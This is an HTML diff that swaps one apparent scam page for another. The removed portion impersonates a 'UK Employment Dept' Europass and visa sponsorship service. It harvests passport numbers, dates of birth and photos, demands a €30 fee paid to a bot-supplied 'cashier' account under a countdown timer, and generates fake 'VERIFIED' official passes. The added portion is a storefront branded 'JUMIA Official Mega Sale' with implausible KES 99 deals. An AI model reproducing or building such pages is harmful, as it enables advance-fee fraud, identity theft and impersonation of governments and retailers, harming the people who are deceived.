+            <svg class="w-5 h-5 text-[#ffd200]" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
+            <span id="cartBadge" class="absolute -top-2 -right-2 bg-[#f68b1e] text-white text-[10px] font-black w-4 h-4 rounded-full flex items-center justify-center">0</span>
+          </div>
+          <span class="hidden sm:inline">Cart</span>
+        </button>
+            </div>
+        </div>
+
+        <!-- STICKY DEPARTMENT NAVIGATION TABS -->
+        <nav class="bg-[#fff8ee] border-t border-orange-200/70">
+            <div id="deptNav" class="max-w-7xl mx-auto px-4 py-2 flex items-center gap-2 overflow-x-auto no-scrollbar text-xs font-extrabold">
+                <button data-dept="all" onclick="selectDepartment('all')" class="dept-tab px-3.5 py-1.5 rounded-full bg-[#111111] text-[#ffd200] whitespace-nowrap transition">🔥 All Categories</button>
+                <button data-dept="flash-poster" onclick="selectDepartment('flash-poster')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">⚡ KES 99–200 Poster Deals</button>
+                <button data-dept="ladies-shoes" onclick="selectDepartment('ladies-shoes')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">👠 Ladies' Shoes & Sneakers</button>
+                <button data-dept="fashion" onclick="selectDepartment('fashion')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">👗 Women's & Girls' Fashion</button>
+                <button data-dept="bags" onclick="selectDepartment('bags')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">👜 Bags & Accessories</button>
+                <button data-dept="mens-formal" onclick="selectDepartment('mens-formal')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">👞 Men's Formal & Loafers</button>
+                <button data-dept="mens-sneakers" onclick="selectDepartment('mens-sneakers')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">👟 Men's Sneakers & Cleats</button>
+                <button data-dept="kids-shoes" onclick="selectDepartment('kids-shoes')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">🧒 Kids' Shoes</button>
+                <button data-dept="audio" onclick="selectDepartment('audio')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">🎧 Earpods & Audio</button>
+                <button data-dept="home-fitness" onclick="selectDepartment('home-fitness')" class="dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition">🏠 Home, Fitness & Phones</button>
+            </div>
+        </nav>
     </header>
 
-    <main class="main-container">
-        <div class="app-card">
+    <!-- HERO BLACK FRIDAY POSTER BANNER -->
+    <section id="top" class="bf-hero-bg relative overflow-hidden py-8 sm:py-12 px-4 border-b-4 border-[#ffd200]">
+        <span class="spark hidden sm:block absolute top-6 left-10 w-4 h-4 bg-[#ffd200] rotate-45 opacity-80"></span>
+        <span class="spark hidden sm:block absolute bottom-10 right-14 w-5 h-3 bg-white -rotate-12 opacity-75"></span>
+        <span class="spark hidden md:block absolute top-1/2 left-1/3 w-3 h-3 bg-[#ffd200] rounded-full opacity-90"></span>
 
-            <div class="progress-bar">
-                <div class="step-node active" id="node-1">1</div>
-                <div class="step-node" id="node-2">2</div>
-                <div class="step-node" id="node-3">3</div>
-            </div>
-
-            <!-- REAL-TIME DYNAMIC STATUS NOTIFICATION POPUPS -->
-            <div class="approval-success-popup" id="approvalSuccessPopup">
-                <h3>🎉 Congratulations! Payment Approved</h3>
-                <p>Your payment has been successfully verified in real time. You are now authorized to download your official documents below!</p>
-            </div>
-
-            <div class="status-popup-banner decline" id="declinePopupBanner">
-                ❌ Payment Not Received: Your transaction could not be verified by the cashier. Please verify your reference or try again.
-            </div>
-
-            <div class="status-popup-banner delay" id="delayPopupBanner">
-                ⏳ Waiting for Payment to be Processed: Your submission is currently queued for manual cashier auditing. Please stand by.
-            </div>
-
-            <div class="status-popup-banner reject" id="rejectPopupBanner">
-                🚫 APPLICATION REJECTED PERMANENTLY: Never to apply again. Your profile has been flagged and barred from future processing.
-            </div>
-
-            <!-- STEP 1: IDENTITY REGISTRATION -->
-            <div class="wizard-view active" id="view-step-1">
-                <h2 class="step-title">1. Sponsor Profile &amp; Europass Verification</h2>
-
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="inputFirstName">Given Names / First Name</label>
-                        <input type="text" id="inputFirstName" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label for="inputLastName">Surname / Last Name</label>
-                        <input type="text" id="inputLastName" class="form-input">
-                    </div>
+        <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+            <!-- Left Poster Headline & CTA -->
+            <div class="lg:col-span-5 text-white space-y-5">
+                <div class="inline-flex items-center gap-2 bg-black/30 backdrop-blur-sm px-3 py-1 rounded-full border border-yellow-300/40">
+                    <span class="font-montserrat font-black text-lg tracking-wider">JUMIA</span>
+                    <span class="bg-[#f68b1e] text-white p-1 rounded-full">
+            <svg class="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24"><path d="M12 2l2.9 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l7.1-1.01L12 2z"/></svg>
+          </span>
+                    <span class="text-xs font-extrabold text-[#ffd200] uppercase">Official Mega Sale</span>
                 </div>
 
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="inputPassport">Passport Serial Number</label>
-                        <input type="text" id="inputPassport" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label for="inputDOB">Date of Birth</label>
-                        <input type="date" id="inputDOB" class="form-input">
-                    </div>
+                <div class="brush-banner px-6 py-5 inline-block">
+                    <h1 class="font-poster text-5xl sm:text-6xl md:text-7xl leading-[0.95] uppercase tracking-tight">
+                        <span class="text-white block">BLACK</span>
+                        <span class="text-[#ffd200] block">NOVEMBER</span>
+                        <span class="text-[#ffd200] block">FRIDAY</span>
+                    </h1>
                 </div>
 
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="inputResidence">Country of Nationality / Residence</label>
-                        <select id="inputResidence" class="form-input">
-                            <option value="">Select your passport issuing nation...</option>
-                            <option value="United Kingdom">United Kingdom (GBP)</option>
-                            <option value="United States">United States (USD)</option>
-                            <option value="Eurozone">Eurozone Countries (EUR)</option>
-                            <option value="South Africa">South Africa (ZAR)</option>
-                            <option value="Philippines">Philippines (PHP)</option>
-                            <option value="India">India (INR)</option>
-                            <option value="Nigeria">Nigeria (NGN)</option>
-                            <option value="Ghana">Ghana (GHS)</option>
-                            <option value="Kenya">Kenya (KES)</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label>Biometric Portrait Upload</label>
-                        <div class="upload-wrapper" onclick="document.getElementById('hiddenFileInput').click()">
-                            <input type="file" id="hiddenFileInput" style="display:none;" accept="image/*">
-                            <strong style="color: #785a14; font-size: 0.95rem;">Select Photo Asset</strong>
-                            <div id="uploadFeedback" style="margin-top: 0.4rem; font-size: 0.85rem; font-weight: 700; color: var(--uk-navy-dark);"></div>
-                        </div>
-                    </div>
+                <div>
+                    <span class="red-ribbon-tag inline-block px-5 py-1.5 font-montserrat font-black italic text-xl sm:text-2xl uppercase tracking-wider text-white">
+            IS HERE!
+          </span>
                 </div>
 
-                <div class="actions-tray" style="justify-content: flex-end;">
-                    <button type="button" class="action-btn btn-fill" onclick="navigateStep2()">Continue to Verification Preview</button>
-                </div>
-            </div>
-
-            <!-- STEP 2: VERIFICATION PREVIEW -->
-            <div class="wizard-view" id="view-step-2">
-                <h2 class="step-title">2. Processing Review &amp; Pre-Authorization</h2>
-
-                <div class="pricing-table">
-                    <div class="pricing-item">
-                        <span>Europass Verification (€15.00) &amp; Visa Sponsorship ETA (€15.00):</span>
-                        <span id="fee-total-gbp">€30.00 EUR</span>
-                    </div>
-                    <div class="pricing-item total-row">
-                        <span>Total Combined Processing Fee:</span>
-                        <span id="fee-total-display">€30.00 EUR</span>
-                    </div>
-                </div>
-
-                <div class="currency-converter-box">
-                    <div>
-                        <div class="currency-label" id="fx-title">Converted Local Currency Equivalent</div>
-                        <div id="fx-breakdown" style="font-size: 0.8rem; color: var(--text-gray); margin-top: 0.35rem; line-height: 1.5;">Calculated automatically based on your selected nationality.</div>
-                    </div>
-                    <div class="currency-value" id="fx-amount">--</div>
-                </div>
-
-                <p style="font-size: 0.95rem; line-height: 1.6; margin-bottom: 1.5rem;">
-                    Your profile data has been structured for verification (€15.00 per document = €30.00 EUR total). Click below to generate your official sponsorship documents and request your payment account details.
+                <p class="font-montserrat font-black italic text-xl sm:text-2xl text-white drop-shadow">
+                    SHOP MORE. <span class="text-[#ffd200]">SPEND LESS!</span>
                 </p>
 
-                <div class="actions-tray">
-                    <button type="button" class="action-btn btn-outline" onclick="navigateBack1()">Modify Profile Data</button>
-                    <button type="button" class="action-btn btn-fill" onclick="processVerificationPreview()">Verify &amp; Generate Documents</button>
+                <div class="flex flex-wrap items-center gap-3 pt-1">
+                    <a href="#sec-flash-poster" class="bg-[#e01b24] hover:bg-[#b80c14] border-2 border-[#ffd200] text-white font-montserrat font-black px-6 py-3.5 rounded-full text-sm sm:text-base uppercase tracking-wide shadow-xl transition transform hover:scale-105">
+            Shop KES 99 Deals →
+          </a>
+                    <div class="bg-[#111111] text-[#ffd200] px-4 py-2.5 rounded-xl font-extrabold text-xs uppercase tracking-wider border border-yellow-400/50">
+                        DON'T MISS OUT!
+                    </div>
                 </div>
             </div>
 
-            <!-- STEP 3: FINAL PASS & CASHIER PAYMENT GATEWAY -->
-            <div class="wizard-view" id="view-step-3">
-
-                <div class="welcome-greet-banner">
-                    <h3>Document Generated &amp; Verified, <span id="clientGreetName">Applicant</span>!</h3>
-                    <p>Your official sponsorship passes are generated below (€30.00 EUR total). Request your payment account details from our cashier desk to settle your processing fee.</p>
-                </div>
-
-                <div class="fulfillment-notice-box">
-                    <h4>Payment Account &amp; Verification Mandate</h4>
-                    <p>
-                        <strong>INSTRUCTIONS:</strong> Click the button below to request your assigned local payment account from the cashier. Once your payment details arrive from your bot, the <strong>15-minute countdown timer</strong> will start automatically.
-                    </p>
-                </div>
-
-                <!-- PAYMENT GATEWAY -->
-                <div class="final-payment-gate">
-                    <h3 id="paymentGateTitle">Secure Cashier Payment Gateway</h3>
-
-                    <!-- REQUEST BUTTON -->
-                    <div id="requestPaymentSection" style="margin-top: 1rem;">
-                        <button type="button" class="cashier-action-btn" onclick="requestPaymentDetailsFromBot()">
-                            💳 Get Payment Detail from Cashier
-                        </button>
-                    </div>
-
-                    <!-- LOADING STATE / BOT DISPATCH SYNC BOX -->
-                    <div id="paymentLoadingState" class="loading-container">
-                        <div class="spinner"></div>
-                        <p style="font-weight: 700; color: var(--uk-navy-dark); font-size: 1rem;">Waiting for cashier to dispatch payment details...</p>
-                        <p style="font-size: 0.85rem; color: var(--text-gray); margin-top: 0.25rem;">Polling active. Alternatively, instantly paste payment details sent from your bot below:</p>
-
-                        <div style="margin-top: 1.5rem; text-align: left; background: #f8fafc; padding: 1.25rem; border-radius: 8px; border: 2px solid var(--uk-gold);">
-                            <label style="font-size: 0.75rem; font-weight: 800; color: #785a14; text-transform: uppercase; display: block; margin-bottom: 0.5rem;">⚡ Instant Bot Payment Dispatch Sync:</label>
-                            <textarea id="instantBotPaymentInput" class="form-input" rows="4" placeholder="Paste exact payment details sent from bot here..."></textarea>
-                            <button type="button" class="action-btn btn-fill" onclick="applyInstantBotPayment()" style="margin-top: 0.75rem; background-color: var(--uk-gold); color: var(--uk-navy-dark); width: 100%;">🚀 Display Details &amp; Start 15-Min Timer</button>
+            <!-- Right Poster Featured 3 Deal Cards -->
+            <div id="sec-flash-poster" class="lg:col-span-7 space-y-4">
+                <!-- Deal Pill 1: Earpods KES 99 -->
+                <div class="bg-[#ffd200] rounded-3xl p-4 sm:p-5 shadow-2xl border-2 border-white/80 flex flex-col sm:flex-row items-center justify-between gap-4 relative overflow-hidden">
+                    <div class="flex items-center gap-4">
+                        <img id="heroImgEarpods" src="" alt="Wireless Earpods" onerror="handleImgFallback(this)" class="w-24 h-24 sm:w-28 sm:h-28 object-cover rounded-2xl bg-white p-1.5 shadow-md shrink-0" />
+                        <div>
+                            <span class="bg-black text-[#ffd200] text-[10px] font-black px-2 py-0.5 rounded uppercase">Doorbuster Flash Deal</span>
+                            <h2 class="font-montserrat font-black text-2xl sm:text-3xl text-[#111111] uppercase mt-1">EARPODS</h2>
+                            <p class="text-xs font-bold text-gray-800">Wireless Bluetooth Charging Case • Only 7 left!</p>
                         </div>
                     </div>
-
-                    <!-- REAL-TIME DYNAMIC PAYMENT DETAILS BLOCK -->
-                    <div id="dynamicPaymentDetailsBlock" style="display:none;" class="payment-channel-card">
-                        <div class="timer-badge" id="countdownTimerBox">
-                            ⏳ Time Remaining to Pay: <span id="timerDisplay">15:00</span>
+                    <div class="flex items-center gap-3 shrink-0">
+                        <div class="price-badge-slant text-white px-4 py-2 rounded-2xl text-center">
+                            <span class="text-xs font-extrabold block leading-none">KES</span>
+                            <span class="font-poster text-4xl sm:text-5xl text-[#ffd200] leading-none">99</span>
                         </div>
-
-                        <div class="bot-payment-details-card">
-                            <div style="font-weight: 800; font-size: 0.9rem; color: #785a14; margin-bottom: 0.5rem;" id="assignedChannelTitle">🇬🇧 Assigned Payment Details (Dispatched from Bot):</div>
-                            <div class="bot-payment-text" id="assignedAccountDetails"></div>
-                            <button type="button" class="copy-btn" onclick="copyPaymentDetails()">📋 Copy Payment Details</button>
-                        </div>
-
-                        <div style="margin-top: 1.25rem;" class="form-grid">
-                            <div class="form-group">
-                                <label for="amountPaid">Amount Paid (€30.00 EUR / Local Equivalent)</label>
-                                <input type="number" id="amountPaid" class="form-input" min="0" step="0.01" placeholder="30.00">
-                            </div>
-                            <div class="form-group">
-                                <label>Upload Payment Receipt Screenshot</label>
-                                <div class="upload-wrapper" onclick="document.getElementById('receiptFileInput').click()" style="padding: 0.75rem;">
-                                    <input type="file" id="receiptFileInput" style="display:none;" accept="image/*">
-                                    <strong style="color: #785a14; font-size: 0.85rem;">Attach Receipt Screenshot</strong>
-                                    <div id="receiptUploadFeedback" style="margin-top: 0.25rem; font-size: 0.75rem; font-weight: 700; color: var(--uk-navy-dark);"></div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="form-group" style="margin-top: 1rem;">
-                            <label for="voucherCode">Payment Receipt Reference / Transaction Hash</label>
-                            <input type="text" id="voucherCode" class="form-input" placeholder="Enter transaction code or reference number...">
-                        </div>
-
-                        <div class="actions-tray" style="margin-top: 1.25rem;">
-                            <button type="button" class="action-btn btn-fill" onclick="submitPaymentForApproval()" style="width:100%; background-color: var(--uk-gold); color: var(--uk-navy-dark);">Submit Payment for Cashier Approval</button>
-                        </div>
+                        <button onclick="quickAddById('poster-earpods')" class="bg-[#111111] hover:bg-[#e01b24] text-white font-extrabold text-xs px-4 py-3.5 rounded-xl uppercase shadow transition">
+              + Add
+            </button>
                     </div>
-
-                    <div id="telegramStatusMsg" style="margin-top: 0.75rem; font-size: 0.85rem; font-weight: 700; text-align: center; display:none;"></div>
                 </div>
 
-                <!-- CARD PREVIEW 1 -->
-                <div class="card-download-block" id="cardBlock1">
-                    <div class="card-preview-wrap">
-                        <div class="card-preview-scale">
-                            <div class="ukpass-premium-identity-card" id="travelCardPreview">
-                                <div class="premium-card-header">
-                                    <div class="premium-header-brand-block">
-                                        <svg viewBox="0 0 24 24">
-                                    <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 2.18l7 3.89v4.93c0 4.54-3.15 8.81-7 9.87-3.85-1.06-7-5.33-7-9.87V8.07l7-3.89zM11 11h2v6h-2v-6zm0-4h2v2h-2V7z"/>
-                                </svg>
-                                        <div class="premium-header-labels">
-                                            <h3>EUROPASS &amp; VISA SPONSORSHIP ETA</h3>
-                                            <h2>UK Employment Dept</h2>
-                                        </div>
-                                    </div>
-                                    <div class="premium-header-origin-tag">
-                                        UNITED KINGDOM<br><span style="font-weight:900; letter-spacing: 1px;">OFFICIAL SPONSORSHIP</span>
-                                    </div>
-                                </div>
-
-                                <div class="premium-card-main-body">
-                                    <img class="premium-uk-map-silhouette" crossorigin="anonymous" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/United_Kingdom_%28orthographic_projection%29.svg/512px-United_Kingdom_%28orthographic_projection%29.svg.png" alt="UK Watermark">
-                                    <div class="premium-passport-photo-holder avatarDisplayBox"></div>
-
-                                    <div class="premium-data-fields-column">
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Full Name</div>
-                                            <div class="premium-field-value cardOutName"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Date of Birth</div>
-                                            <div class="premium-field-value cardOutDOB"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Nationality</div>
-                                            <div class="premium-field-value cardOutNation"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Passport No.</div>
-                                            <div class="premium-field-value cardOutPassport"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Issued</div>
-                                            <div class="premium-field-value cardOutIssued" style="color: #785a14;"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Valid Until</div>
-                                            <div class="premium-field-value cardOutExpiry" style="color: #785a14;"></div>
-                                        </div>
-                                    </div>
-
-                                    <div class="premium-card-status-pane">
-                                        <div class="premium-status-pill-badge">VERIFIED</div>
-                                        <div class="premium-qr-code-holder">
-                                            <svg viewBox="0 0 100 100" stroke="none">
-                                        <rect x="0" y="0" width="100" height="100" fill="#ffffff"/>
-                                        <rect x="10" y="10" width="30" height="30" fill="#0b1c2d"/>
-                                        <rect x="15" y="15" width="20" height="20" fill="#ffffff"/>
-                                        <rect x="20" y="20" width="10" height="10" fill="#0b1c2d"/>
-                                        <rect x="60" y="10" width="30" height="30" fill="#0b1c2d"/>
-                                        <rect x="65" y="15" width="20" height="20" fill="#ffffff"/>
-                                        <rect x="70" y="20" width="10" height="10" fill="#0b1c2d"/>
-                                        <rect x="10" y="60" width="30" height="30" fill="#0b1c2d"/>
-                                        <rect x="15" y="65" width="20" height="20" fill="#ffffff"/>
-                                        <rect x="20" y="70" width="10" height="10" fill="#0b1c2d"/>
-                                        <rect x="45" y="15" width="8" height="15" fill="#0b1c2d"/>
-                                        <rect x="45" y="40" width="12" height="8" fill="#0b1c2d"/>
-                                        <rect x="15" y="45" width="15" height="8" fill="#0b1c2d"/>
-                                        <rect x="70" y="45" width="15" height="12" fill="#0b1c2d"/>
-                                        <rect x="45" y="60" width="10" height="25" fill="#0b1c2d"/>
-                                        <rect x="65" y="70" width="20" height="15" fill="#0b1c2d"/>
-                                    </svg>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <div class="premium-card-footer-ribbon">
-                                    <div style="font-weight: 700; letter-spacing: 0.25px;">OVERSEAS EMPLOYMENT SPONSORSHIP VERIFICATION COPY</div>
-                                    <div class="cardOutRef" style="font-family: monospace; font-weight:900; color: var(--uk-navy-dark); font-size: 0.75rem;"></div>
-                                </div>
-                            </div>
+                <!-- Deal Pill 2: Ladies' Shoes KES 200 -->
+                <div class="bg-[#ffd200] rounded-3xl p-4 sm:p-5 shadow-2xl border-2 border-white/80 flex flex-col sm:flex-row items-center justify-between gap-4 relative overflow-hidden">
+                    <div class="flex items-center gap-4">
+                        <img id="heroImgShoes" src="" alt="Ladies Shoes" onerror="handleImgFallback(this)" class="w-24 h-24 sm:w-28 sm:h-28 object-cover rounded-2xl bg-white p-1.5 shadow-md shrink-0" />
+                        <div>
+                            <span class="bg-black text-[#ffd200] text-[10px] font-black px-2 py-0.5 rounded uppercase">Limited Stock</span>
+                            <h2 class="font-montserrat font-black text-2xl sm:text-3xl text-[#111111] uppercase leading-tight mt-1">LADIES' SHOES</h2>
+                            <p class="text-xs font-bold text-gray-800">Blush Bow Stiletto Heels • Sizes 37–42</p>
                         </div>
                     </div>
-                    <button type="button" id="btnDownload1" class="action-btn btn-fill" onclick="downloadCardAsImage(1)" style="margin-top: 1.5rem; background-color: var(--uk-navy-dark); padding: 0.85rem 2rem; width: 100%; max-width: 400px;">Download Sponsorship Pass</button>
-                    <div class="download-lock-note" id="downloadLockNote1" style="display:block;">Download locked. Pending real-time cashier verification &amp; approval confirmation.</div>
+                    <div class="flex items-center gap-3 shrink-0">
+                        <div class="price-badge-slant text-white px-4 py-2 rounded-2xl text-center">
+                            <span class="text-xs font-extrabold block leading-none">KES</span>
+                            <span class="font-poster text-4xl sm:text-5xl text-[#ffd200] leading-none">200</span>
+                        </div>
+                        <button onclick="quickAddById('poster-heels')" class="bg-[#111111] hover:bg-[#e01b24] text-white font-extrabold text-xs px-4 py-3.5 rounded-xl uppercase shadow transition">
+              + Add
+            </button>
+                    </div>
                 </div>
 
-                <!-- CARD PREVIEW 2 -->
-                <div class="card-download-block" id="cardBlock2">
-                    <div class="card-preview-wrap">
-                        <div class="card-preview-scale">
-                            <div class="ukpass-premium-identity-card" id="certificateCardPreview">
-                                <div class="premium-card-header alt-header-theme">
-                                    <div class="premium-header-brand-block">
-                                        <div class="premium-header-labels">
-                                            <h2 style="font-size: 1.45rem; letter-spacing: 0.5px;">EUROPASS VISA SPONSORSHIP CERTIFICATE</h2>
-                                            <h3 style="letter-spacing: 1px; margin-top: 0.2rem; opacity: 0.85; font-size: 0.7rem;">IMMIGRATION DEPARTMENT RECORD SUMMARY</h3>
-                                        </div>
-                                    </div>
-                                    <div class="premium-header-origin-tag" style="font-weight: 900; font-size: 0.85rem;">
-                                        UNITED KINGDOM<br><span style="font-weight:300; font-size: 0.65rem;">GREAT BRITAIN</span>
-                                    </div>
-                                </div>
-
-                                <div class="premium-card-main-body">
-                                    <img class="premium-uk-map-silhouette" crossorigin="anonymous" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/United_Kingdom_%28orthographic_projection%29.svg/512px-United_Kingdom_%28orthographic_projection%29.svg.png" alt="UK Watermark">
-                                    <div class="premium-passport-photo-holder avatarDisplayBox"></div>
-
-                                    <div class="premium-data-fields-column">
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Applicant</div>
-                                            <div class="premium-field-value cardOutName"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">DOB Registry</div>
-                                            <div class="premium-field-value cardOutDOB"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Passport Origin</div>
-                                            <div class="premium-field-value cardOutNation"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">Passport Serial</div>
-                                            <div class="premium-field-value cardOutPassport"></div>
-                                        </div>
-                                        <div class="premium-field-row">
-                                            <div class="premium-field-label">System Ref</div>
-                                            <div class="premium-field-value cardOutRef" style="font-family: monospace; color: var(--uk-navy-mid);"></div>
-                                        </div>
-                                    </div>
-
-                                    <div class="premium-card-status-pane">
-                                        <div class="premium-status-pill-badge" style="background-color: #eff6ff; border-color: #bfdbfe; color: #1e40af;">SPONSORED</div>
-                                        <div style="font-size: 0.6rem; color: var(--text-gray); text-align: right; font-weight: 700; line-height: 1.4;">
-                                            ISSUE DATE: <span class="cardOutIssued" style="color: #000; font-weight: 800;"></span><br> EXPIRY DATE: <span class="cardOutExpiry" style="color: #000; font-weight: 800;"></span>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <div class="premium-card-footer-ribbon" style="background-color: #f1f5f9;">
-                                    <div style="font-weight: 600;">EUROPASS OVERSEAS EMPLOYMENT SPONSORSHIP RECORD COPY</div>
-                                </div>
-                            </div>
+                <!-- Deal Pill 3: Ladies' Jumpsuits KES 200 -->
+                <div class="bg-[#ffd200] rounded-3xl p-4 sm:p-5 shadow-2xl border-2 border-white/80 flex flex-col sm:flex-row items-center justify-between gap-4 relative overflow-hidden">
+                    <div class="flex items-center gap-4">
+                        <img id="heroImgJumpsuit" src="" alt="Ladies Jumpsuits" onerror="handleImgFallback(this)" class="w-24 h-24 sm:w-28 sm:h-28 object-cover rounded-2xl bg-white p-1.5 shadow-md shrink-0" />
+                        <div>
+                            <span class="bg-black text-[#ffd200] text-[10px] font-black px-2 py-0.5 rounded uppercase">Hot Seller</span>
+                            <h2 class="font-montserrat font-black text-2xl sm:text-3xl text-[#111111] uppercase leading-tight mt-1">LADIES' JUMPSUITS</h2>
+                            <p class="text-xs font-bold text-gray-800">Burgundy Belted V-Neck • Sizes XS–XXL</p>
                         </div>
                     </div>
-                    <button type="button" id="btnDownload2" class="action-btn btn-fill" onclick="downloadCardAsImage(2)" style="margin-top: 1.5rem; background-color: var(--uk-gold); color: var(--uk-navy-dark); padding: 0.85rem 2rem; width: 100%; max-width: 400px;">Download Sponsorship Certificate</button>
-                    <div class="download-lock-note" id="downloadLockNote2" style="display:block;">Download locked. Pending real-time cashier verification &amp; approval confirmation.</div>
+                    <div class="flex items-center gap-3 shrink-0">
+                        <div class="price-badge-slant text-white px-4 py-2 rounded-2xl text-center">
+                            <span class="text-xs font-extrabold block leading-none">KES</span>
+                            <span class="font-poster text-4xl sm:text-5xl text-[#ffd200] leading-none">200</span>
+                        </div>
+                        <button onclick="quickAddById('poster-jumpsuit')" class="bg-[#111111] hover:bg-[#e01b24] text-white font-extrabold text-xs px-4 py-3.5 rounded-xl uppercase shadow transition">
+              + Add
+            </button>
+                    </div>
                 </div>
-
             </div>
-
         </div>
+    </section>
+
+    <!-- MAIN STOREFRONT CONTAINER -->
+    <main class="max-w-7xl mx-auto px-4 py-8 space-y-10">
+
+        <!-- SHOP BY SIZE STAR BADGES & GIRLS FASHION BANNERS -->
+        <section class="bg-white rounded-2xl p-5 shadow-sm border border-gray-200 space-y-6">
+            <div class="flex flex-wrap items-center justify-between gap-2">
+                <div>
+                    <h2 class="font-montserrat font-black text-lg sm:text-xl text-[#111111] uppercase">⭐ Shop By Your Exact Size</h2>
+                    <p class="text-xs text-gray-500">Tap a clothing or shoe size star to filter matching items across all categories</p>
+                </div>
+                <button onclick="clearSizeFilter()" id="resetSizeBtn" class="hidden text-xs font-extrabold text-[#e01b24] underline">Reset Size Filter</button>
+            </div>
+
+            <div class="grid grid-cols-5 sm:grid-cols-6 md:grid-cols-11 gap-2.5">
+                <button onclick="toggleSizeFilter('S')" data-size="S" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">S</button>
+                <button onclick="toggleSizeFilter('XS')" data-size="XS" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">XS</button>
+                <button onclick="toggleSizeFilter('L')" data-size="L" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">L</button>
+                <button onclick="toggleSizeFilter('XL')" data-size="XL" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">XL</button>
+                <button onclick="toggleSizeFilter('XXL')" data-size="XXL" class="star-badge rounded-2xl py-3 font-montserrat font-black text-base sm:text-lg text-[#111111] shadow-sm">XXL</button>
+                <button onclick="toggleSizeFilter('37')" data-size="37" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">37</button>
+                <button onclick="toggleSizeFilter('38')" data-size="38" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">38</button>
+                <button onclick="toggleSizeFilter('39')" data-size="39" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">39</button>
+                <button onclick="toggleSizeFilter('40')" data-size="40" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">40</button>
+                <button onclick="toggleSizeFilter('41')" data-size="41" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">41</button>
+                <button onclick="toggleSizeFilter('42')" data-size="42" class="star-badge rounded-2xl py-3 font-montserrat font-black text-lg sm:text-xl text-[#111111] shadow-sm">42</button>
+            </div>
+
+            <!-- Girls Fashion 3-Card Banner Strip -->
+            <div class="pt-2">
+                <h3 class="font-bold text-sm text-gray-800 mb-3">Girls Fashion</h3>
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                    <div onclick="selectDepartment('fashion')" class="cursor-pointer group rounded-xl overflow-hidden border border-gray-200 shadow-sm hover:shadow-md transition">
+                        <div class="h-36 overflow-hidden bg-sky-100">
+                            <img id="catImgClothes" src="" alt="Girls Clothes" onerror="handleImgFallback(this)" class="w-full h-full object-cover group-hover:scale-105 transition duration-300" />
+                        </div>
+                        <div class="bg-[#27272a] text-white text-center py-2 font-bold text-sm">Clothes</div>
+                    </div>
+
+                    <div onclick="selectDepartment('kids-shoes')" class="cursor-pointer group rounded-xl overflow-hidden border border-gray-200 shadow-sm hover:shadow-md transition">
+                        <div class="h-36 overflow-hidden bg-gray-100">
